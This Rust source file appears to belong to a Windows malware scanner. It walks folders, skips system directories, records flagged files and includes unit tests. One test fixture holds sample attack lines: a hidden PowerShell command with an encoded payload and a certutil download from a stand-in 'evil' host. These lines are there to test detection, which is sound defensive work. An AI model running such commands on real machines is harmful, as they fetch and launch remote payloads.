use crate::modules::i18n::tr4;
use std::collections::HashSet;
use std::ffi::c_void;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::Instant;

use super::file_analyzer::{scan_file, FileScanReport};

pub const DEFAULT_LOCATION_SCAN_MAX_FILES: usize = 5000;
const MAX_SCANNABLE_BYTES: u64 = 64 * 1024 * 1024;
const PROGRESS_NOTIFY_EVERY: usize = 16;
const PROGRESS_MIN_INTERVAL_MS: u128 = 20;

#[derive(Debug, Default)]
struct ProgressThrottle {
    last_emit: Option<Instant>,
}

impl ProgressThrottle {
    fn new() -> Self {
        Self::default()
    }

    fn allow(&mut self) -> bool {
        if self
            .last_emit
            .is_some_and(|t| t.elapsed().as_millis() < PROGRESS_MIN_INTERVAL_MS)
        {
            return false;
        }
        self.last_emit = Some(Instant::now());
        true
    }
}

#[derive(Debug, Clone)]
pub struct LocationScanOptions {
    pub max_files: usize,
    pub extensions: Vec<String>,
}

impl Default for LocationScanOptions {
    fn default() -> Self {
        Self {
            max_files: DEFAULT_LOCATION_SCAN_MAX_FILES,
            extensions: Vec::new(),
        }
    }
}

#[derive(Debug, Clone)]
pub struct ThreatHit {
    pub file_path: String,
    pub file_name: String,
    pub risk_score: i32,
    pub risk_level: String,
    pub top_category: String,
}

impl ThreatHit {
    fn from_report(report: &FileScanReport) -> Self {
        let top_category = report
            .findings
            .first()
            .map(|f| f.category.clone())
            .unwrap_or_else(|| report.risk_level.clone());
        Self {
            file_path: report.file_path.clone(),
            file_name: report.file_name.clone(),
            risk_score: report.risk_score,
            risk_level: report.risk_level.clone(),
            top_category,
        }
    }
}

#[derive(Debug, Clone)]
pub struct LocationScanReport {
    pub root: String,
    pub files_scanned: usize,
    pub files_skipped: usize,
    pub directories_visited: usize,
    pub threats: Vec<ThreatHit>,
    pub cancelled: bool,
    pub budget_reached: bool,
    pub elapsed_ms: u128,
}

impl LocationScanReport {
    fn empty(root: &Path) -> Self {
        Self {
            root: root.to_string_lossy().to_string(),
            files_scanned: 0,
            files_skipped: 0,
            directories_visited: 0,
            threats: Vec::new(),
            cancelled: false,
            budget_reached: false,
            elapsed_ms: 0,
        }
    }

    pub fn malicious_count(&self) -> usize {
        self.threats
            .iter()
            .filter(|t| t.risk_level == "MALICIOUS")
            .count()
    }
}

fn noise_dir_names() -> &'static [&'static str] {
    &[
        "node_modules",
        ".git",
        ".svn",
        "$recycle.bin",
        "system volume information",
        "perflogs",
        "recovery",
        "msocache",
    ]
}

fn os_protected_roots() -> Vec<PathBuf> {
    let mut roots = Vec::new();
    for key in [
        "SystemRoot",
        "WINDIR",
        "ProgramFiles",
        "ProgramFiles(x86)",
        "ProgramData",
    ] {
        if let Ok(value) = std::env::var(key) {
            let p = PathBuf::from(value);
            if p.is_absolute() {
                roots.push(p);
            }
        }
    }
    roots
}

fn path_covered_by(path: &Path, root: &Path) -> bool {
    let p = path.to_string_lossy().to_ascii_lowercase();
    let mut r = root.to_string_lossy().to_ascii_lowercase();
    while r.ends_with('\\') || r.ends_with('/') {
        r.pop();
    }
    if p == r {
        return true;
    }
    p.starts_with(&r)
        && p[r.len()..]
            .chars()
            .next()
            .is_some_and(|c| c == '\\' || c == '/')
}

fn is_skippable_dir(path: &Path, roots: &[PathBuf]) -> bool {
    for root in roots {
        if path_covered_by(path, root) {
            return true;
        }
    }
    if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
        let lower = name.to_ascii_lowercase();
        if noise_dir_names().contains(&lower.as_str()) {
            return true;
        }
    }
    false
}

fn extension_allowed(path: &Path, extensions: &[String]) -> bool {
    if extensions.is_empty() {
        return true;
    }
    match path.extension().and_then(|e| e.to_str()) {
        Some(ext) => extensions
            .iter()
            .any(|wanted| wanted.eq_ignore_ascii_case(ext.trim_start_matches('.'))),
        None => false,
    }
}

fn is_threat_level(level: &str) -> bool {
    level == "MALICIOUS" || level == "SUSPICIOUS"
}

pub fn scan_location<Progress, Threat>(
    root: &Path,
    options: &LocationScanOptions,
    cancel: &AtomicBool,
    mut progress: Progress,
    mut on_threat: Threat,
) -> LocationScanReport
where
    Progress: FnMut(usize, usize, &Path),
    Threat: FnMut(&FileScanReport),
{
    let started = Instant::now();
    let roots = os_protected_roots();
    let mut report = LocationScanReport::empty(root);

    if !root.is_dir() || is_skippable_dir(root, &roots) {
        report.elapsed_ms = started.elapsed().as_millis();
        return report;
    }

    let mut visited: HashSet<PathBuf> = HashSet::new();
    visited.insert(root.canonicalize().unwrap_or_else(|_| root.to_path_buf()));
    let mut stack: Vec<PathBuf> = vec![root.to_path_buf()];
    let mut throttle = ProgressThrottle::new();

    while let Some(dir) = stack.pop() {
        if cancel.load(Ordering::Relaxed) {
            report.cancelled = true;
            break;
        }
        if report.files_scanned >= options.max_files {
            report.budget_reached = true;
            break;
        }
        let read = match std::fs::read_dir(&dir) {
            Ok(entries) => entries,
            Err(_) => continue,
        };
        report.directories_visited += 1;

        for entry in read.flatten() {
            if cancel.load(Ordering::Relaxed) {
                report.cancelled = true;
                break;
            }
            if report.files_scanned >= options.max_files {
                report.budget_reached = true;
                break;
            }
            let path = entry.path();
            let file_type = match entry.file_type() {
                Ok(t) => t,
                Err(_) => continue,
            };
            if file_type.is_dir() {
                let canonical = path.canonicalize().unwrap_or_else(|_| path.clone());
                if visited.insert(canonical) && !is_skippable_dir(&path, &roots) {
                    stack.push(path);
                }
                continue;
            }
            if !file_type.is_file() {
                continue;
            }
            if !extension_allowed(&path, &options.extensions) {
                continue;
            }
            let metadata = match entry.metadata() {
                Ok(m) => m,
                Err(_) => {
                    report.files_skipped += 1;
                    continue;
                }
            };
            if metadata.len() == 0 || metadata.len() > MAX_SCANNABLE_BYTES {
                report.files_skipped += 1;
                continue;
            }
            match scan_file(&path) {
                Ok(scan) => {
                    report.files_scanned += 1;
                    if is_threat_level(&scan.risk_level) {
                        report.threats.push(ThreatHit::from_report(&scan));
                        on_threat(&scan);
                    }
                    if report.files_scanned.is_multiple_of(PROGRESS_NOTIFY_EVERY)
                        && throttle.allow()
                    {
                        progress(report.files_scanned, report.threats.len(), &path);
                    }
                }
                Err(_) => {
                    report.files_skipped += 1;
                }
            }
        }
    }

    progress(
        report.files_scanned,
        report.threats.len(),
        Path::new(report.root.as_str()),
    );
    report.elapsed_ms = started.elapsed().as_millis();
    report
}

#[cfg(windows)]
#[repr(C)]
struct BrowseInfoW {
    hwnd_owner: *mut c_void,
    pidl_root: *const c_void,
    display_name: *mut u16,
    title: *const u16,
    flags: u32,
    callback: Option<unsafe extern "system" fn(*mut c_void, u32, i32, isize) -> i32>,
    l_param: isize,
    image: i32,
}

#[cfg(windows)]
#[link(name = "shell32", kind = "raw-dylib", modifiers = "+verbatim")]
unsafe extern "system" {
    fn SHBrowseForFolderW(lpbi: *mut BrowseInfoW) -> *mut c_void;
    fn SHGetPathFromIDListW(pidl: *const c_void, psz_path: *mut u16) -> i32;
}

#[cfg(windows)]
#[link(name = "ole32", kind = "raw-dylib", modifiers = "+verbatim")]
unsafe extern "system" {
    fn CoInitializeEx(pv_reserved: *mut c_void, dw_coinit: u32) -> i32;
    fn CoUninitialize();
    fn CoTaskMemFree(pv: *mut c_void);
}

#[cfg(windows)]
pub fn pick_folder_dialog(owner_hwnd: *mut c_void) -> Option<String> {
    let title: Vec<u16> = tr4(
        "Chọn thư mục hoặc ổ đĩa để quét",
        "Select Folder or Drive to Scan",
        "选择要扫描的文件夹或驱动器",
        "Выберите папку или диск для проверки",
    )
    .encode_utf16()
    .chain(std::iter::once(0))
    .collect();

    let mut display_name = vec![0u16; 260];
    let com_hr = unsafe { CoInitializeEx(std::ptr::null_mut(), 0x2) };
    let must_uninit = com_hr == 0;

    let picked = unsafe {
        let mut info = BrowseInfoW {
            hwnd_owner: owner_hwnd,
            pidl_root: std::ptr::null(),
            display_name: display_name.as_mut_ptr(),
            title: title.as_ptr(),
            flags: 0x0001 | 0x0010 | 0x0040,
            callback: None,
            l_param: 0,
            image: 0,
        };
        let pidl = SHBrowseForFolderW(&mut info);
        if pidl.is_null() {
            None
        } else {
            let mut path_buf = vec![0u16; 260];
            let ok = SHGetPathFromIDListW(pidl, path_buf.as_mut_ptr());
            CoTaskMemFree(pidl);
            if ok != 0 {
                let end = path_buf
                    .iter()
                    .position(|&c| c == 0)
                    .unwrap_or(path_buf.len());
                Some(String::from_utf16_lossy(&path_buf[..end]))
            } else {
                None
            }
        }
    };

    if must_uninit {
        unsafe { CoUninitialize() };
    }
    picked
}

#[cfg(not(windows))]
pub fn pick_folder_dialog(owner_hwnd: *mut c_void) -> Option<String> {
    let _ = owner_hwnd;
    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use std::io::Write;

    fn unique_temp_dir(tag: &str) -> PathBuf {
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(0);
        let dir = std::env::temp_dir().join(format!("sg_loc_{tag}_{nanos}"));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        dir
    }

    fn write_file(path: &Path, content: &[u8]) {
        if let Some(parent) = path.parent() {
            let _ = fs::create_dir_all(parent);
        }
        let mut f = fs::File::create(path).unwrap();
        f.write_all(content).unwrap();
    }

    const MALICIOUS_TEXT: &[u8] = b"Hello friend, have a nice day!\npowershell -windowstyle hidden -enc aG52b2tlLWV4cHJlc3Npb24gKA==\ncertutil -urlcache http://evil/payload.exe\n";

    #[test]
    fn detects_threat_and_benign_files() {
        let dir = unique_temp_dir("detect");
        write_file(
            &dir.join("readme.txt"),
            b"just a friendly note about the weather",
        );
        write_file(&dir.join("nested/deploy.ps1"), MALICIOUS_TEXT);

        let cancel = AtomicBool::new(false);
        let report = scan_location(
            &dir,
            &LocationScanOptions::default(),
            &cancel,
            |_, _, _| {},
            |_| {},
        );

        let _ = fs::remove_dir_all(&dir);
        assert_eq!(report.files_scanned, 2);
        assert!(report
            .threats
            .iter()
            .any(|t| t.risk_level == "MALICIOUS" && t.file_name == "deploy.ps1"));
        assert!(report.malicious_count() >= 1);
    }

    #[test]
    fn respects_max_files_budget() {
        let dir = unique_temp_dir("budget");
        for i in 0..20 {
            write_file(
                &dir.join(format!("f{i}.txt")),
                b"plain harmless content here",
            );
        }

        let cancel = AtomicBool::new(false);
        let opts = LocationScanOptions {
            max_files: 5,
            extensions: Vec::new(),
        };
        let report = scan_location(&dir, &opts, &cancel, |_, _, _| {}, |_| {});

        let _ = fs::remove_dir_all(&dir);
        assert_eq!(report.files_scanned, 5);
        assert!(report.budget_reached);
    }

    #[test]
    fn extension_filter_limits_scanned_files() {
        let dir = unique_temp_dir("ext");
        write_file(&dir.join("note.txt"), b"plain text file");
        write_file(&dir.join("image.png"), b"\x89PNG\r\n\x1a\nbinary-ish");
        write_file(&dir.join("script.ps1"), MALICIOUS_TEXT);

        let cancel = AtomicBool::new(false);
        let opts = LocationScanOptions {
            max_files: 100,
            extensions: vec!["ps1".to_string()],
        };
        let report = scan_location(&dir, &opts, &cancel, |_, _, _| {}, |_| {});

        let _ = fs::remove_dir_all(&dir);
        assert_eq!(report.files_scanned, 1);
        assert_eq!(report.threats.len(), 1);
    }

    #[test]
    fn cancel_stops_scan_early() {
        let dir = unique_temp_dir("cancel");
        for i in 0..50 {
            write_file(&dir.join(format!("file{i}.bin")), b"data");
        }

        let cancel = AtomicBool::new(true);
        let report = scan_location(
            &dir,
            &LocationScanOptions::default(),
            &cancel,
            |_, _, _| {},
            |_| {},
        );

        let _ = fs::remove_dir_all(&dir);
        assert!(report.cancelled);
        assert_eq!(report.files_scanned, 0);
    }

    #[test]
    fn threat_callback_fires_per_threat() {
        let dir = unique_temp_dir("callback");
        write_file(&dir.join("a.ps1"), MALICIOUS_TEXT);
        write_file(&dir.join("b.ps1"), MALICIOUS_TEXT);

        let cancel = AtomicBool::new(false);
        let fired = std::sync::atomic::AtomicUsize::new(0);
        let report = scan_location(
            &dir,
            &LocationScanOptions::default(),
            &cancel,
            |_, _, _| {},
            |_| {
                fired.fetch_add(1, Ordering::SeqCst);
            },
        );

        let _ = fs::remove_dir_all(&dir);
        assert_eq!(fired.load(Ordering::SeqCst), report.threats.len());
        assert_eq!(report.threats.len(), 2);
    }

    #[test]
    fn empty_dir_produces_no_findings() {
        let dir = unique_temp_dir("empty");
        let cancel = AtomicBool::new(false);
        let report = scan_location(
            &dir,
            &LocationScanOptions::default(),
            &cancel,
            |_, _, _| {},
            |_| {},
        );
        let _ = fs::remove_dir_all(&dir);
        assert_eq!(report.files_scanned, 0);
        assert!(report.threats.is_empty());
    }

    #[test]
    fn progress_throttle_allows_immediately_then_blocks_within_interval() {
        let mut throttle = ProgressThrottle::new();
        assert!(throttle.allow());
        assert!(!throttle.allow());
        assert!(!throttle.allow());
    }

    #[test]
    fn progress_throttle_allows_again_after_interval_elapsed() {
        let mut throttle = ProgressThrottle::new();
        assert!(throttle.allow());
        std::thread::sleep(std::time::Duration::from_millis(
            PROGRESS_MIN_INTERVAL_MS as u64 + 5,
        ));
        assert!(throttle.allow());
    }

    #[test]
    fn path_covered_by_requires_path_separator_boundary() {
        let root = Path::new("C:\\Program Files");
        assert!(path_covered_by(Path::new("C:\\Program Files\\App"), root));
        assert!(path_covered_by(Path::new("C:\\Program Files"), root));
        assert!(path_covered_by(Path::new("C:\\Program Files\\"), root));
        assert!(!path_covered_by(Path::new("C:\\Program Files Evil"), root));
        assert!(!path_covered_by(Path::new("C:\\Program FilesX"), root));
        assert!(!path_covered_by(Path::new("C:\\Program"), root));
    }
}
